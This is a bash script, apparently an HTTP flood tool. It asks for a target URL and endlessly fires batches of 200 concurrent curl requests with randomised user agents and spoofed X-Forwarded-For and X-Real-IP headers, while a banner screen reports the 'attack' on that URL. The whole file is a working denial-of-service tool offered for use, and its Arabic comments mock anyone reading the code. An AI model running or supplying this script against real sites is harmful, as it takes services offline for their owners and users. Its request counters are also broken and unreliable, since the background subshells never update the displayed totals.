#!/bin/bash


URL=""
SUCCESS_COUNT=0
FAILURE_COUNT=0
THREADS=200
PORT=4000


RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
NC="\e[0m" 


clear
echo -e "${CYAN}"
echo "██████╗ ███████╗"
echo "██╔══██╗██╔════╝"
echo "██║  ██║█████╗  "
echo "██║  ██║██╔══╝  "
echo "██████╔╝██"
echo "╚═════╝ ╚═"
echo -e "${YELLOW}------------------------------------${NC}"
echo -e "${YELLOW}   Developed by:@A_Y_TR             ${NC}"
echo -e "${YELLOW}------------------------------------${NC}"
echo


echo -e "${YELLOW}Enter the target URL (with http or https): ${NC}"
read -r URL


generate_random_ip() {
    echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
}


generate_user_agent() {
    echo "Mozilla/5.0 (Linux; Android $(shuf -i 4-12 -n 1)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$(shuf -i 70-100 -n 1).0.$(shuf -i 1000-4000 -n 1).$(shuf -i 50-150 -n 1) Mobile Safari/537.36"
}

# ازيك بتفتش في الكود لي شايفك
send_request() {
    local RANDOM_IP
    RANDOM_IP=$(generate_random_ip)
    local USER_AGENT
    USER_AGENT=$(generate_user_agent)

    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "User-Agent: $USER_AGENT" \
        -H "X-Forwarded-For: $RANDOM_IP" \
        -H "X-Real-IP: $RANDOM_IP" \
        "$URL")
    
    if [[ "$RESPONSE" == "200" ]]; then
        ((SUCCESS_COUNT++))
    else
        ((FAILURE_COUNT++))
    fi
}


start_attack() {
    while :; do
        for ((i = 0; i < THREADS; i++)); do
            send_request &
        done
        wait
    done
}


display_stats() {
    while :; do
        clear
        echo -e "${CYAN}██████╗ ███████╗"
        echo -e "██╔══██╗██╔════╝"
        echo -e "██║  ██║█████╗  "
        echo -e "██║  ██║██╔══╝  "
        echo -e "██████╔╝██╗"
        echo -e "╚═════╝ ╚══════╝${NC}"
        echo -e "${GREEN}------------------------------------${NC}"
        echo -e "Attacking URL: ${YELLOW}${URL}${NC}"
        echo -e "${GREEN}Successful Requests: ${SUCCESS_COUNT}${NC}"
        echo -e "${RED}Failed Requests: ${FAILURE_COUNT}${NC}"
        echo -e "${YELLOW}------------------------------------${NC}"
        sleep 2
    done
}

#خلصت تفتيش في الكود ولا لسه استغفر الله العظيم كمل تفتيش ولا يهمك 
start_attack &
display_stats
